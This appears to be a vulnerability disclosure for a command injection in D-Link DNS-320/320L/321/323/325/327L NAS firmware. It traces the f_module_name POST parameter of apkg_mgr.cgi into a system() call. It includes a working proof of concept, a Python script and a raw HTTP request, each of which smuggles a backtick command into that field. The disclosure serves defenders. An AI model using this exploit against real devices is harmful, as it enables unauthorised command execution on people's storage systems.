# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L all firmware version has a command injection vulnerability in module_enable_disable function of the file /cgi-bin/apkg_mgr.cgi.  The variable `f_module_name`is passed from a POST request and is assigned to `v4` via the `snprintf` function at line 49 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723735144192-6a7cf4e6-bdb3-4129-bf32-43c50ce8b26a.png#averageHue=%23fefefb&clientId=u17b96338-1736-4&from=paste&height=109&id=u176b3f7c&originHeight=138&originWidth=744&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21408&status=done&style=none&taskId=u66f03b50-b689-4025-ace4-7908ed45846&title=&width=589)
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723735136333-77c46c75-f7c0-46e0-b084-dd700618c47f.png#averageHue=%23f8f8f8&clientId=u17b96338-1736-4&from=paste&height=120&id=ubb430aea&originHeight=120&originWidth=1175&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20786&status=done&style=none&taskId=ua89d8343-900e-46f4-a3aa-1a7846f6d80&title=&width=1175)
# POC
```java
import requests

url = "http://192.168.0.32/cgi-bin/apkg_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=module_enable_disable&f_module_name=`touch%09/tmp/126`&f_enable=1"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```java
POST /cgi-bin/apkg_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=module_enable_disable&f_module_name=`touch%09/tmp/126`&f_enable=1
```

